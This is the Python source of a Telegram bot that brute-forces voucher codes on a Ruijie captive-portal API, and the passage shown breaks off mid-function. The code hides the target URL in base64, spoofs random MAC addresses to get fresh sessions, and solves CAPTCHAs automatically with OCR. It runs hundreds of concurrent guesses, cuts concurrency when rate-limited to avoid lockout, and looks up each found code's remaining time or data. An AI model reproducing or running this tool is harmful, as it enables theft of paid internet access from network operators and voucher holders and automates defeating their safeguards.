"""
Voucher Bot — Production Edition (multi-length, plan-filter, checkpoint, adaptive)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ပြင်ထားတဲ့ bug:
  #1  Resume snapshot immutable (frozen dataclass) — mutate မဖြစ်တော့
  #2  Cancel-safe batch — cancel ဖြစ်တိုင်း ပြီးသား success မဆုံးရှုံး
  #3  Digit mode generator + block shuffle — memory မပေါက်, 0-prefix ထိန်း
  #4  Scan lock (asyncio.Lock) — is_scanning race ပျောက်
  #5  Notify msg_id ကို limited မှာပါ သိမ်း (message ID bug)
  #6  Notification debounce — editing race ကြောင့် Telegram 400 spam ပျောက်
  #7  Rate-limit exponential backoff + counter
  #8  Plan filter fail_open option (default False)
  #9  Web-server task exception log (leak မဖြစ်)

အသစ် ပြင်ထားတဲ့ bug (v2):
  #10 Polling timeout race — request_timeout > timeout (45 > 30)
  #11 Captcha threadpool starvation — Semaphore(cpu_count) gate
  #12 Session per-request churn — ClientSession pool + cookie jar reset
  #13 Checkpoint write throttle — file I/O spam ကာကွယ် (5s interval)
  #14 Graceful pool shutdown — pooled sessions clean close

ထည့်ထားတဲ့ feature:
  • Checkpoint persistence (JSON) — restart ဖြစ်လည်း resume
  • Live dashboard — speed / ETA / captcha rate
  • Adaptive concurrency — rate-limit များလာရင် auto-lower
  • Time + Data plan filter (1d, 500mb, 1gb)
  • Graceful shutdown (SIGTERM/SIGINT)
  • CSV export
"""
from __future__ import annotations

import asyncio
import aiohttp
import base64
import csv
import io
import ipaddress
import itertools
import json
import logging
import os
import random
import re
import signal
import string
import time
import uuid
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urlparse

import cv2
import ddddocr
import numpy as np
from aiohttp import web
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
logger = logging.getLogger("voucherbot")


# ── Configuration ────────────────────────────────────────────────────────────
class Config:
    BOT_TOKEN: str = os.environ.get("BOT_TOKEN", "")
    ADMIN_ID:  str = os.environ.get("ADMIN_ID", "")
    PORT:      int = int(os.environ.get("PORT", 8099))

    CONCURRENCY:         int   = 200
    CONCURRENCY_FLOOR:   int   = 25
    BATCH_SIZE:          int   = 500
    MAX_CAPTCHA_RETRIES: int   = 8
    RATE_LIMIT_RETRIES:  int   = 3
    RATE_LIMIT_SLEEP:    float = 2.0
    RATE_LIMIT_MAX_SLEEP:float = 20.0

    # notify debounce window (sec)
    NOTIFY_DEBOUNCE:     float = 0.6
    # checkpoint file write throttle (sec)
    CHECKPOINT_THROTTLE: float = 5.0

    # Plan filter behaviour — plan info မရှိရင် reject (default)
    PLAN_FAIL_OPEN:      bool  = os.environ.get("PLAN_FAIL_OPEN", "0") == "1"

    # persistence
    PERSIST_SCANS:       bool  = os.environ.get("PERSIST_SCANS", "1") == "1"
    CHECKPOINT_FILE:     str   = os.environ.get("CHECKPOINT_FILE", "scan_checkpoint.json")

    POST_URL: str = base64.b64decode(
        b"aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM="
    ).decode()

    BRUTE_MODES: dict = {
        "1": {"name": "Digits (0-9)",      "charset": string.digits},
        "2": {"name": "Lowercase (a-z)",    "charset": string.ascii_lowercase},
        "3": {"name": "Uppercase (A-Z)",    "charset": string.ascii_uppercase},
        "4": {"name": "Mixed (a-zA-Z)",     "charset": string.ascii_letters},
        "5": {"name": "Lowercase + Digits", "charset": string.ascii_lowercase + string.digits},
    }

    PLAN_UNITS: dict = {
        "mo": 30 * 24 * 60,
        "y":  365 * 24 * 60,
        "d":  24 * 60,
        "h":  60,
        "m":  1,
    }
    DATA_UNITS: dict = {
        "tb": 1024 * 1024 * 1024,
        "gb": 1024 * 1024,
        "mb": 1024,
        "kb": 1,
    }

    PLAN_TOLERANCE: float = 0.15   # ±15%
    PLAN_MIN_MARGIN: int  = 30     # ±30 min always

    # session pool size (max idle sessions kept)
    SESSION_POOL_SIZE: int = 400

    @classmethod
    def validate(cls) -> None:
        if not cls.BOT_TOKEN or not cls.ADMIN_ID:
            raise ValueError("BOT_TOKEN and ADMIN_ID are required")

    @classmethod
    def is_admin(cls, uid) -> bool:
        return str(uid) == cls.ADMIN_ID


# ── Data models ─────────────────────────────────────────────────────────────
@dataclass
class FoundCode:
    code:       str
    session_id: str
    plan:       str = "N/A"
    display:    str = ""
    plan_minutes: Optional[int] = None
    data_kb:    Optional[int] = None


@dataclass
class ScanParams:
    mode:    str
    lengths: list[int]
    target:  Optional[int]        = None
    plans:   list[int]            = field(default_factory=list)   # time filter (minutes)
    data:    list[int]            = field(default_factory=list)   # data filter (KB)


@dataclass(frozen=True)
class ScanCheckpoint:
    """Immutable resume snapshot — running scan mutate မလုပ်နိုင်."""
    mode:        str
    lengths:     tuple[int, ...]
    target:      Optional[int]
    plans:       tuple[int, ...]
    data:        tuple[int, ...]
    length_idx:  int = 0                                   # digit mode
    offsets:     tuple[tuple[int, int], ...] = ()          # manual mode: length→offset
    total_found: int = 0

    def as_params(self) -> ScanParams:
        return ScanParams(
            mode=self.mode, lengths=list(self.lengths),
            target=self.target, plans=list(self.plans), data=list(self.data),
        )

    def to_json(self) -> str:
        return json.dumps({
            "mode": self.mode, "lengths": self.lengths, "target": self.target,
            "plans": self.plans, "data": self.data,
            "length_idx": self.length_idx, "offsets": self.offsets,
            "total_found": self.total_found,
        })

    @classmethod
    def from_json(cls, raw: str) -> "ScanCheckpoint":
        d = json.loads(raw)
        return cls(
            mode=d["mode"], lengths=tuple(d["lengths"]), target=d.get("target"),
            plans=tuple(d.get("plans", [])), data=tuple(d.get("data", [])),
            length_idx=d.get("length_idx", 0),
            offsets=tuple(map(tuple, d.get("offsets", []))),
            total_found=d.get("total_found", 0),
        )


@dataclass
class ScanTask:
    task:    asyncio.Task
    scan_id: str
    stop:    bool = False


@dataclass
class ChatState:
    session_url:     str                   = ""
    scan_task:       Optional[ScanTask]    = None
    success_codes:   list                  = field(default_factory=list)
    limited_codes:   list                  = field(default_factory=list)
    notify:          bool                  = True
    checkpoint:      Optional[ScanCheckpoint] = None
    pending_params:  Optional[ScanParams]  = None
    success_msg_id:  Optional[int]         = None
    limited_msg_id:  Optional[int]         = None
    scan_lock:       asyncio.Lock          = field(default_factory=asyncio.Lock)


# ── State manager ────────────────────────────────────────────────────────────
class BotState:
    def __init__(self) -> None:
        self._chats: dict[int, ChatState] = {}
        self._start: float = time.monotonic()

    def get(self, chat_id: int) -> ChatState:
        if chat_id not in self._chats:
            self._chats[chat_id] = ChatState()
        return self._chats[chat_id]

    def is_scanning(self, chat_id: int) -> bool:
        st = self.get(chat_id).scan_task
        return st is not None and not st.task.done()

    def clear_results(self, chat_id: int) -> None:
        s = self.get(chat_id)
        s.success_codes = []
        s.limited_codes = []
        s.success_msg_id = None
        s.limited_msg_id = None

    def uptime(self) -> str:
        sec = int(time.monotonic() - self._start)
        h, r = divmod(sec, 3600)
        m, s = divmod(r, 60)
        return f"{h}h {m}m {s}s"


bot   = AsyncTeleBot(Config.BOT_TOKEN)
state = BotState()

_global_session: aiohttp.ClientSession
_connector:      aiohttp.TCPConnector
_web_task:       Optional[asyncio.Task] = None


# ── Global counters ─────────────────────────────────────────────────────────
_rl_counter   = [0]                # rate-limit hit count
_captcha_tried = 0
_captcha_ok    = 0

def rl_hits_count():
    return _rl_counter


# ── Formatters ───────────────────────────────────────────────────────────────
def fmt_seconds(val) -> str:
    s = int(val); h, r = divmod(s, 3600); m = r // 60
    if h: return f"{h}h {m}m"
    if m: return f"{m}m"
    return f"{s}s"


def fmt_minutes(val) -> str:
    t = int(val)
    if t <= 0: return "0m"
    if t < 60: return f"{t}m"
    h = t // 60; m = t % 60
    if h < 24: return f"{h}h {m}m" if m else f"{h}h"
    d = h // 24; rh = h % 24
    if d < 30: return f"{d}d {rh}h" if rh else f"{d}d"
    mo = d // 30; rd = d % 30
    return f"{mo}mo {rd}d" if rd else f"{mo}mo"


def fmt_bytes(b) -> str:
    try:
        n = float(b)
        if n >= 1_073_741_824: return f"{n/1_073_741_824:.2f} GB"
        if n >= 1_048_576:     return f"{n/1_048_576:.1f} MB"
        if n >= 1_024:         return f"{n/1_024:.1f} KB"
        return f"{int(n)} B"
    except Exception:
        return "Unknown"


def fmt_duration(sec: Optional[float]) -> str:
    if sec is None or sec <= 0 or sec == float("inf"):
        return "—"
    sec = int(sec)
    h, r = divmod(sec, 3600); m, s = divmod(r, 60)
    if h: return f"{h}h {m}m"
    if m: return f"{m}m {s}s"
    return f"{s}s"


def plan_label(minutes: int) -> str:
    if minutes >= 525_600: return f"{minutes // 525_600}y"
    if minutes >= 43_200:  return f"{minutes // 43_200}mo"
    if minutes >= 1_440:   return f"{minutes // 1_440}d"
    if minutes >= 60:      return f"{minutes // 60}h"
    return f"{minutes}m"


def data_label(kb: int) -> str:
    if kb >= 1024 * 1024: return f"{kb // (1024*1024)}GB"
    if kb >= 1024:        return f"{kb // 1024}MB"
    return f"{kb}KB"


# ── Argument parsers ─────────────────────────────────────────────────────────
def parse_lengths(s: str) -> list[int]:
    result: set[int] = set()
    for part in s.split(","):
        part = part.strip()
        if "-" in part:
            a, b = part.split("-", 1)
            try:
                lo, hi = int(a), int(b)
                if lo > hi: lo, hi = hi, lo
                result.update(range(lo, hi + 1))
            except ValueError:
                raise ValueError(f"Invalid length range: '{part}'")
        else:
            try:
                result.add(int(part))
            except ValueError:
                raise ValueError(f"Invalid length: '{part}'")
    if not result:
        raise ValueError("No valid lengths specified")
    bad = [l for l in result if not 1 <= l <= 20]
    if bad:
        raise ValueError(f"Lengths must be 1-20, got: {bad}")
    return sorted(result)


def parse_plan_minutes(s: str) -> Optional[int]:
    sl = s.lower().strip()
    for suffix in sorted(Config.PLAN_UNITS, key=len, reverse=True):
        if sl.endswith(suffix) and len(sl) > len(suffix):
            try:
                n = int(sl[: -len(suffix)])
                if n > 0:
                    return n * Config.PLAN_UNITS[suffix]
            except ValueError:
                pass
    return None


def parse_data_kb(s: str) -> Optional[int]:
    sl = s.lower().strip()
    for suffix in sorted(Config.DATA_UNITS, key=len, reverse=True):
        if sl.endswith(suffix) and len(sl) > len(suffix):
            try:
                n = float(sl[: -len(suffix)])
                if n > 0:
                    return int(n * Config.DATA_UNITS[suffix])
            except ValueError:
                pass
    return None


def parse_brute_args(args: list[str]) -> ScanParams:
    if len(args) < 2:
        raise ValueError("mode နှင့် lengths လိုအပ်သည်")

    mode = args[0]
    if mode not in Config.BRUTE_MODES:
        raise ValueError(f"Mode 1-5 အကြားဖြစ်ရမည်, ရရှိသည်: '{mode}'")

    lengths = parse_lengths(args[1])
    target: Optional[int] = None
    plans: list[int] = []
    data:  list[int] = []

    for arg in args[2:]:
        if arg.isdigit():
            if target is not None:
                raise ValueError(f"Target ကိန်းနှစ်ခု မပေးနိုင်: '{arg}'")
            target = int(arg)
            if target < 1:
                raise ValueError("Target ≥ 1 ဖြစ်ရမည်")
            continue

        mins = parse_plan_minutes(arg)
        if mins is not None:
            if mins not in plans:
                plans.append(mins)
            continue

        kb = parse_data_kb(arg)
        if kb is not None:
            if kb not in data:
                data.append(kb)
            continue

        raise ValueError(
            f"Unknown argument '{arg}'\n"
            f"Plan: 1h 3h 1d 7d 1mo 1y | Data: 500mb 1gb 2gb"
        )

    return ScanParams(mode=mode, lengths=lengths, target=target, plans=plans, data=data)


# ── Plan / data filter ───────────────────────────────────────────────────────
def matches_filter(minutes: Optional[int], data_kb: Optional[int],
                   plan_filters: list[int], data_filters: list[int]) -> bool:
    """
    filter မရှိရင် accept။
    filter ရှိပြီး info မရှိရင် → Config.PLAN_FAIL_OPEN တိုင်း (default reject).
    time-plan filter → minutes ကို စစ်
    data filter      → data_kb ကို စစ်
    """
    if not plan_filters and not data_filters:
        return True

    fail_open = Config.PLAN_FAIL_OPEN

    # time-plan filter
    if plan_filters:
        if minutes is None:
            if not fail_open:
                if not data_filters:
                    return False
            else:
                return True
        else:
            ok = False
            for f in plan_filters:
                margin = max(f * Config.PLAN_TOLERANCE, Config.PLAN_MIN_MARGIN)
                if abs(minutes - f) <= margin:
                    ok = True
                    break
            if not ok:
                return False

    # data filter
    if data_filters:
        if data_kb is None:
            return fail_open
        ok = False
        for f in data_filters:
            margin = max(int(f * Config.PLAN_TOLERANCE), 1)
            if abs(data_kb - f) <= margin:
                ok = True
                break
        if not ok:
            return False

    return True


# ── SSRF guard ───────────────────────────────────────────────────────────────
def is_safe_url(url: str) -> bool:
    try:
        p = urlparse(url)
        if p.scheme not in ("http", "https"): return False
        host = (p.hostname or "").lower()
        if not host or host in ("localhost", "0.0.0.0"): return False
        try:
            addr = ipaddress.ip_address(host)
            if any([addr.is_loopback, addr.is_private, addr.is_link_local,
                    addr.is_reserved, addr.is_unspecified, addr.is_multicast]):
                return False
        except ValueError:
            pass
        return True
    except Exception:
        return False


# ── CAPTCHA solver (bug #11 fix) ─────────────────────────────────────────────
_ocr = ddddocr.DdddOcr(show_ad=False)
_UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
       "(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36")

# ONNX inference သည် CPU core တစ်ခုစာ စားသည် → core အရေအတွက်အတိုင်း gate ချ
_captcha_gate = asyncio.Semaphore(max(4, (os.cpu_count() or 4)))


def _solve_sync(img_bytes: bytes) -> Optional[str]:
    arr = np.frombuffer(img_bytes, np.uint8)
    img = cv2.imdecode(arr, cv2.IMREAD_COLOR)
    if img is None: return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY | cv2.THRESH_OTSU)
    _, buf = cv2.imencode(".png", thresh)
    return _ocr.classification(buf.tobytes()).upper()


async def solve_captcha(img_bytes: bytes) -> Optional[str]:
    # threadpool starvation ကာကွယ် — ONNX inference တစ်ချိန်တစ်ခုသာ core အရေအတွက်အတိုင်း
    async with _captcha_gate:
        return await asyncio.to_thread(_solve_sync, img_bytes)


# ── Network helpers ──────────────────────────────────────────────────────────
def _random_mac() -> str:
    b = [random.choice([0x02, 0x06, 0x0A, 0x0E])] + [random.randint(0, 255) for _ in range(5)]
    return ":".join(f"{x:02x}" for x in b)


def _replace_mac(url: str, mac: str) -> str:
    return re.sub(r"(?<=mac=)[^&]+", mac, url)


async def fetch_session_id(http: aiohttp.ClientSession, session_url: str,
                           fallback: Optional[str] = None) -> Optional[str]:
    url = _replace_mac(session_url, _random_mac())
    try:
        async with http.get(url, headers={"accept": "text/html,*/*;q=0.8", "user-agent": _UA},
                            allow_redirects=True, timeout=aiohttp.ClientTimeout(total=15)) as r:
            m = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(r.url))
            return m.group(1) if m else fallback
    except Exception as e:
        logger.debug("fetch_session_id: %s", e)
        return fallback


async def _fetch_captcha_img(http: aiohttp.ClientSession, sid: str) -> bytes:
    params = {"sessionId": sid, "_t": str(time.time())}
    async with http.get(
        "https://portal-as.ruijienetworks.com/api/auth/captcha/image",
        params=params,
        headers={"authority": "portal-as.ruijienetworks.com",
                 "accept": "image/*,*/*;q=0.8", "user-agent": _UA},
        timeout=aiohttp.ClientTimeout(total=10),
    ) as r:
        return await r.read()


async def _verify_captcha(http: aiohttp.ClientSession, sid: str, code: str) -> bool:
    async with http.post(
        "https://portal-as.ruijienetworks.com/api/auth/captcha/verify",
        headers={"authority": "portal-as.ruijienetworks.com",
                 "content-type": "application/json", "user-agent": _UA},
        json={"sessionId": sid, "authCode": code},
        timeout=aiohttp.ClientTimeout(total=10),
    ) as r:
        return (await r.json(content_type=None)).get("success") is True


async def solve_captcha_loop(http: aiohttp.ClientSession, sid: str) -> Optional[str]:
    global _captcha_tried, _captcha_ok
    for _ in range(Config.MAX_CAPTCHA_RETRIES):
        _captcha_tried += 1
        try:
            img = await _fetch_captcha_img(http, sid)
            text = await solve_captcha(img)
            if text and await _verify_captcha(http, sid, text):
                _captcha_ok += 1
                return text
        except Exception as e:
            logger.debug("captcha attempt: %s", e)
    return None


# ── ClientSession pool (bug #12 fix) ─────────────────────────────────────────
_session_pool: asyncio.Queue = asyncio.Queue(maxsize=Config.SESSION_POOL_SIZE)


async def _acquire_session() -> aiohttp.ClientSession:
    """Pool မှ ယူ၊ မရှိရင် အသစ် ဖန်တီး (connector မျှဝေ)."""
    try:
        return _session_pool.get_nowait()
    except asyncio.QueueEmpty:
        return aiohttp.ClientSession(
            connector=_connector, connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=aiohttp.ClientTimeout(total=30),
        )


async def _release_session(s: aiohttp.ClientSession) -> None:
    """Cookie clear ပြီး pool ထဲ ပြန်ထည့် (pool ပြည့်ရင် ပိတ်)."""
    if s.closed:
        return
    try:
        s.cookie_jar.clear()
    except Exception:
        pass
    try:
        _session_pool.put_nowait(s)
    except asyncio.QueueFull:
        try:
            await s.close()
        except Exception:
            pass


async def _drain_session_pool() -> None:
    while not _session_pool.empty():
        try:
            s = _session_pool.get_nowait()
            if not s.closed:
                await s.close()
        except asyncio.QueueEmpty:
            break
        except Exception:
            pass


# ── Plan / balance info ──────────────────────────────────────────────────────
async def get_code_info(active_id: str) -> tuple[str, Optional[int], Optional[int]]:
    """
    Returns (display_str, minutes_or_None, data_kb_or_None).
    time → ⏰ | data → 💾 | mixed → two
    """
    urls = [
        f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{active_id}",
        f"https://portal-as.ruijienetworks.com/api/macc/balance/getBalance/{active_id}",
        f"https://portal-as.ruijienetworks.com/api/maccauth/balance/getBalance/{active_id}",
        f"https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{active_id}",
    ]
    headers = {"accept": "application/json, */*; q=0.01", "user-agent": _UA,
               "x-requested-with": "XMLHttpRequest"}

    s = await _acquire_session()
    try:
        for url in urls:
            try:
                async with s.get(url, headers=headers) as r:
                    if r.status != 200:
                        continue
                    raw = await r.json(content_type=None)
                    data = raw if isinstance(raw, dict) else {}
                    result = data.get("result", data)
                    if not isinstance(result, dict):
                        result = data

                    profile = result.get("profileName", "Unknown")
                    parts: list[str] = []
                    minutes: Optional[int] = None
                    data_kb: Optional[int] = None

                    # time-based
                    for key in ("totalMinutes", "remainingMinutes", "remainMinutes",
                                "leftMinutes", "balance", "remaining"):
                        if result.get(key) is not None:
                            minutes = int(result[key])
                            parts.append(f"⏰ Time: {fmt_minutes(minutes)}")
                            break
                    if minutes is None:
                        for key in ("remainingSeconds", "remainTime", "remainingTime",
                                    "leftTime", "timeLeft"):
                            if result.get(key) is not None:
                                secs = int(result[key])
                                minutes = secs // 60
                                parts.append(f"⏰ Time: {fmt_seconds(secs)}")
                                break

                    # data-based
                    for key in ("remainBytes", "totalBytes", "remainFlow",
                                "totalFlow", "flowBalance", "trafficRemain"):
                        if result.get(key) is not None:
                            data_kb = int(result[key]) // 1024
                            parts.append(f"💾 Data: {fmt_bytes(result[key])}")
                            break
                    if data_kb is None:
                        for key in ("remainGb", "totalGb", "usedGb"):
                            if result.get(key) is not None:
                                data_kb = int(float(result[key]) * 1024 * 1024)
                                parts.append(f"💾 Data: {float(result[key]):.2f} GB")
                                break
                    if data_kb is None:
                        for key in ("remainMb", "totalMb", "remainingMb"):
                            if result.get(key) is not None:
                                data_kb = int(float(result[key]) * 1024)
                                parts.append(f"💾 Data: {float(result[key]):.1f} MB")
                                break
                    if data_kb is None:
                        for key in ("remainKb", "totalKb"):
                            if result.get(key) is not None:
                                data_kb = int(result[key])
                                parts.append(f"💾 Data: {fmt_bytes(data_kb * 1024)}")
                                break

                    if parts:
                        return f"🃏 Plan: {profile} | " + " | ".join(parts), minutes, data_kb
            except Exception as e:
                logger.debug("get_code_info %s: %s", url, e)
    finally:
        await _release_session(s)

    return "🃏 Plan: Unknown", None, None


async def check_session_url(url: str) -> bool:
    if not is_safe_url(url):
        return False
    try:
        async with _global_session.get(
            url, allow_redirects=True,
            headers={"accept": "text/html,*/*;q=0.8", "user-agent": _UA},
            timeout=aiohttp.ClientTimeout(total=15),
        ) as r:
            if r.status >= 400:
                return False
            final = str(r.url)
            body = await r.text()
            return any(t in final or t in body
                       for t in ["sessionId", "maccauth", "portal-as.ruijienetworks.com"])
    except Exception as e:
        logger.error("check_session_url: %s", e)
        return False


# ── Notification helpers (debounced, bug #5 + #6) ────────────────────────────
async def _notify_success(chat_id: int, s: ChatState) -> None:
    lines = "\n\n".join(
        fc.display or f"🎫 `{fc.code}`\n   {fc.plan}" for fc in s.success_codes
    )
    text = f"✅ Success Codes ({len(s.success_codes)}):\n\n{lines}"
    # Telegram 4096 limit ထက် ကျော်ရင် နောက်ဆုံး အခုကို ပဲ ပို့
    if len(text) > 4000:
        tail = s.success_codes[-10:]
        lines = "\n\n".join(fc.display or f"🎫 `{fc.code}`" for fc in tail)
        text = (f"✅ Success Codes ({len(s.success_codes)}) — last {len(tail)}:\n\n"
                f"{lines}\n\n_(/saved ဖြင့် အားလုံးကြည့်)_")
    try:
        if s.success_msg_id is None:
            msg = await bot.send_message(chat_id, text, parse_mode="Markdown")
            s.success_msg_id = msg.message_id
        else:
            await bot.edit_message_text(chat_id=chat_id, message_id=s.success_msg_id,
                                        text=text, parse_mode="Markdown")
    except Exception as e:
        try:
            msg = await bot.send_message(chat_id, text, parse_mode="Markdown")
            s.success_msg_id = msg.message_id
        except Exception as e2:
            logger.debug("_notify_success: %s / %s", e, e2)


async def _notify_limited(chat_id: int, s: ChatState) -> None:
    tail = s.limited_codes[-50:]
    text = f"⚠️ Limited Codes ({len(s.limited_codes)}):\n" + "\n".join(tail)
    try:
        if s.limited_msg_id is None:
            msg = await bot.send_message(chat_id, text)
            s.limited_msg_id = msg.message_id
        else:
            await bot.edit_message_text(chat_id=chat_id, message_id=s.limited_msg_id, text=text)
    except Exception as e:
        try:
            msg = await bot.send_message(chat_id, text)
            s.limited_msg_id = msg.message_id
        except Exception as e2:
            logger.debug("_notify_limited: %s / %s", e, e2)


class NotifyDebouncer:
    """edit race spam ကာကွယ် — 0.6s စုပြီး တစ်ခါ edit."""
    def __init__(self, fn):
        self._fn = fn
        self._tasks: dict[int, asyncio.Task] = {}

    def schedule(self, chat_id: int, s: ChatState):
        old = self._tasks.get(chat_id)
        if old and not old.done():
            return
        async def _run():
            await asyncio.sleep(Config.NOTIFY_DEBOUNCE)
            try:
                await self._fn(chat_id, s)
            except Exception as e:
                logger.debug("notify debounce: %s", e)
            self._tasks.pop(chat_id, None)
        self._tasks[chat_id] = asyncio.create_task(_run())


_notify_success_deb = NotifyDebouncer(_notify_success)
_notify_limited_deb = NotifyDebouncer(_notify_limited)


# ── Adaptive semaphore ───────────────────────────────────────────────────────
class AdaptiveSemaphore:
    """rate-limit များလာရင် concurrency auto-lower."""
    def __init__(self, initial: int, floor: int = 25):
        self._initial = initial
        self._target  = initial
        self._floor   = floor
        self._sem     = asyncio.Semaphore(initial)

    async def __aenter__(self):
        await self._sem.acquire()
        return self

    async def __aexit__(self, *exc):
        self._sem.release()

    @property
    def current(self) -> int:
        return self._target

    def on_rate_limit(self):
        new = max(self._floor, int(self._target * 0.75))
        if new < self._target:
            self._target = new

    def on_success_streak(self, n: int = 300):
        if self._target < self._initial:
            self._target = min(self._initial, self._target + 1)


# ── Code generators ─────────────────────────────────────────────────────────
def iter_codes(mode: str, length: int, start: int = 0):
    """
    Digit mode: 0-padded, block-shuffled generator (memory-သေး, exhaustive).
    Manual mode: infinite random stream.
    """
    charset = Config.BRUTE_MODES[mode]["charset"]

    if mode == "1":
        block = 5000
        total = 10 ** length
        idx   = list(range(start, total))
        for b_start in range(0, len(idx), block):
            chunk = idx[b_start: b_start + block]
            random.shuffle(chunk)
            for i in chunk:
                yield str(i).zfill(length)
    else:
        while True:
            yield "".join(random.choice(charset) for _ in range(length))


# ── Progress display ─────────────────────────────────────────────────────────
def format_progress(checked: int, total: Optional[int], speed: float,
                    found: int, params: ScanParams, current_len: int,
                    eta: Optional[float], concurrency: int, rl_hits: int) -> str:
    mode_name = Config.BRUTE_MODES.get(params.mode, {}).get("name", "")
    multi = len(params.lengths) > 1
    if multi:
        idx = params.lengths.index(current_len) + 1
        len_str = f"{current_len} ({idx}/{len(params.lengths)})"
    else:
        len_str = str(current_len)

    lines = [
        "📋 Status: Running",
        f"🎯 Mode: {mode_name}",
        f"📏 Length: {len_str}",
    ]

    if total is not None:
        pct = (checked / total) * 100
        filled = min(20, int(pct / 5))
        bar = "█" * filled + "░" * (20 - filled)
        lines += [f"📊 {checked:,}/{total:,} ({pct:.1f}%)", f"[{bar}]"]
    else:
        lines.append(f"🔍 Checked: {checked:,}")

    lines += [
        f"⚡ Speed: {speed:,.0f}/min",
        f"⏱ ETA: {fmt_duration(eta)}",
        f"💎 Found: {found}",
        f"🧵 Concurrency: {concurrency}  |  ⚠️ RL: {rl_hits}",
    ]

    if params.target:
        lines.append(f"🏆 Target: {found}/{params.target}")

    filt = []
    if params.plans:
        filt.append(" / ".join(plan_label(m) for m in params.plans))
    if params.data:
        filt.append(" / ".join(data_label(k) for k in params.data))
    if filt:
        lines.append(f"🎛 Filter: {' | '.join(filt)}")

    return "\n".join(lines)


async def _safe_edit(chat_id: int, msg_id: int, text: str) -> int:
    try:
        await bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=text)
        return msg_id
    except Exception:
        try:
            nm = await bot.send_message(chat_id, text)
            return nm.message_id
        except Exception:
            return msg_id


# ── Checkpoint persistence (bug #13: throttled write) ────────────────────────
_last_cp_save: dict[int, float] = {}


def _save_checkpoint(chat_id: int, cp: ScanCheckpoint, force: bool = False) -> None:
    if not Config.PERSIST_SCANS:
        return
    now = time.monotonic()
    if not force:
        last = _last_cp_save.get(chat_id, 0.0)
        if now - last < Config.CHECKPOINT_THROTTLE:
            return
    _last_cp_save[chat_id] = now
    try:
        data = {}
        if os.path.exists(Config.CHECKPOINT_FILE):
            with open(Config.CHECKPOINT_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        data[str(chat_id)] = cp.to_json()
        # atomic write
        tmp = Config.CHECKPOINT_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)
        os.replace(tmp, Config.CHECKPOINT_FILE)
    except Exception as e:
        logger.debug("_save_checkpoint: %s", e)


def _load_checkpoint(chat_id: int) -> Optional[ScanCheckpoint]:
    if not Config.PERSIST_SCANS or not os.path.exists(Config.CHECKPOINT_FILE):
        return None
    try:
        with open(Config.CHECKPOINT_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        raw = data.get(str(chat_id))
        return ScanCheckpoint.from_json(raw) if raw else None
    except Exception as e:
        logger.debug("_load_checkpoint: %s", e)
        return None


def _clear_checkpoint(chat_id: int) -> None:
    if not Config.PERSIST_SCANS or not os.path.exists(Config.CHECKPOINT_FILE):
        return
    try:
        with open(Config.CHECKPOINT_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        data.pop(str(chat_id), None)
        tmp = Config.CHECKPOINT_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)
        os.replace(tmp, Config.CHECKPOINT_FILE)
        _last_cp_save.pop(chat_id, None)
    except Exception as e:
        logger.debug("_clear_checkpoint: %s", e)


# ── Brute-force engine (cancel-safe) ─────────────────────────────────────────
async def run_bruteforce(params: ScanParams, chat_id: int, session_url: str,
                         scan_id: str, progress_msg_id: int,
                         resume_cp: Optional[ScanCheckpoint] = None) -> None:
    sem = AdaptiveSemaphore(Config.CONCURRENCY, Config.CONCURRENCY_FLOOR)
    s = state.get(chat_id)
    scan_start = time.monotonic()
    is_digit = (params.mode == "1")

    total_found = resume_cp.total_found if resume_cp else 0
    rl_hits = 0
    ok_streak = 0
    final_cp: Optional[ScanCheckpoint] = None

    async def _check(code: str) -> Optional[str]:
        nonlocal rl_hits, ok_streak
        async with sem:
            r = await perform_check(session_url, code, chat_id, scan_id,
                                    plan_filters=params.plans, data_filters=params.data)
            if r:
                ok_streak += 1
                if ok_streak >= 300:
                    sem.on_success_streak()
                    ok_streak = 0
            return r

    async def _run_batch(codes: list[str]) -> int:
        """cancel-safe — cancel ဖြစ်လည်း ပြီးသား result ယူ."""
        found = 0
        tasks = [asyncio.create_task(_check(c)) for c in codes]
        try:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            found = sum(1 for r in results if isinstance(r, str) and r)
        except asyncio.CancelledError:
            for t in tasks:
                if t.done() and not t.cancelled():
                    try:
                        r = t.result()
                        if isinstance(r, str) and r:
                            found += 1
                    except Exception:
                        pass
            for t in tasks:
                if not t.done():
                    t.cancel()
            raise
        return found

    def _target_hit() -> bool:
        return bool(params.target and total_found >= params.target)

    def _should_stop() -> bool:
        ct = s.scan_task
        return ct is None or ct.scan_id != scan_id or ct.stop

    def _make_cp(length_idx: int, offsets: dict[int, int]) -> ScanCheckpoint:
        return ScanCheckpoint(
            mode=params.mode,
            lengths=tuple(params.lengths),
            target=params.target,
            plans=tuple(params.plans),
            data=tuple(params.data),
            length_idx=length_idx,
            offsets=tuple(sorted(offsets.items())),
            total_found=total_found,
        )

    try:
        if is_digit:
            start_idx = resume_cp.length_idx if resume_cp else 0
            for idx, length in enumerate(params.lengths):
                if idx < start_idx:
                    continue
                if _target_hit() or _should_stop():
                    break

                total_for_length = 10 ** length
                length_checked = 0
                codes = iter_codes(params.mode, length)
